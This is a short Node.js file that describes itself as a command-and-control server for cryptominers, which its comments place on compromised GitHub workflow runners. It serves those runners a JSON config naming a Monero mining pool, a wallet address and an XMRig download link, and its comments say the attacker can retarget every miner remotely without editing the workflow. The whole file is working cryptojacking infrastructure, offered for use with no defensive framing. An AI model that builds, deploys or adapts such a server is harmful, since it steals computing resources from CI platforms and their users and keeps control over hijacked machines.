// Filename: server.js
const http = require('http');

// This is the configuration object the server will send to each miner.
// An attacker can change this file on the server at any time to change the
// behavior of all miners without touching the GitHub workflow.
const dynamicConfig = {
  // Instructions for what to mine
  pool: {
    url: "pool.supportxmr.com:5555",
    user: "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP",
    pass: "x"
  },
  // Instructions for what software to download
  miner: {
    version: "6.21.2",
    downloadUrl: "https://github.com/xmrig/xmrig/releases/download/v6.21.2/xmrig-6.21.2-msvc-win64.zip",
    // The attacker could even add the executable name if it changes between versions
    executable: "xmrig.exe" 
  }
};

const requestHandler = (request, response) => {
  console.log(`Serving config to a new runner from IP: ${request.socket.remoteAddress}`);
  
  // Set the header to indicate the response is JSON
  response.setHeader('Content-Type', 'application/json');
  response.writeHead(200);
  
  // Convert the JavaScript object to a JSON string and send it
  response.end(JSON.stringify(dynamicConfig));
};

const server = http.createServer(requestHandler);
const port = process.env.PORT || 3000; // Use Render's port or default to 3000

server.listen(port, (err) => {
  if (err) {
    return console.log('Error starting server:', err);
  }
  console.log(`C2 server is listening on port ${port}`);
});
